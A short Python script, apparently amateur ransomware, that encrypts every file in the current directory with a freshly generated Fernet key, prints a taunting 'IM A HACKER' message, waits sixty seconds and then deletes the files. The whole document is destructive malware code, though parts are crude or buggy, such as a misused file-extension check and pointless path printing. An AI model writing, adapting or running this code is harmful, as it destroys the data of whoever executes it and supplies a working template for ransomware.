import os
import sys
from cryptography.fernet import Fernet
import time

files = []
for file in os.listdir():
    if file == '.idea':
        continue
    files.append(file)
print(files)

for file in files:
    a = file.endswith('.py' or '.png' or '.jpg' or '.mp3' or '.mp4' or '.html' or '.txt' or 'apk')
for a in files:
    b = os.path.isfile(a)
    print(b, '\nFalse means dir not file and True means file not dir')
    c = sys.path.copy()
    if b is True:
        print(c)
    else:
        d = sys.argv[0]
        print(d)
key = Fernet.generate_key()
with open('key.key', 'wb') as k:
    k.write(key)
fernet = Fernet(key)
for file in files:
    with open(file, 'rb') as f:
        enc = f.read()
    f_enc = fernet.encrypt(enc)
    with open(file, 'wb') as w:
        w.write(f_enc)
print('YOUR ALL FILES HAS BEEN ENCRYPTED AND IT WILL BE DELETED IN 60 SECS , GOODBYE \nIM A HACKER')
t = time.sleep(60)
print(t)
for file in files:
    o = os.remove(file)
    if t is True:
        print(o)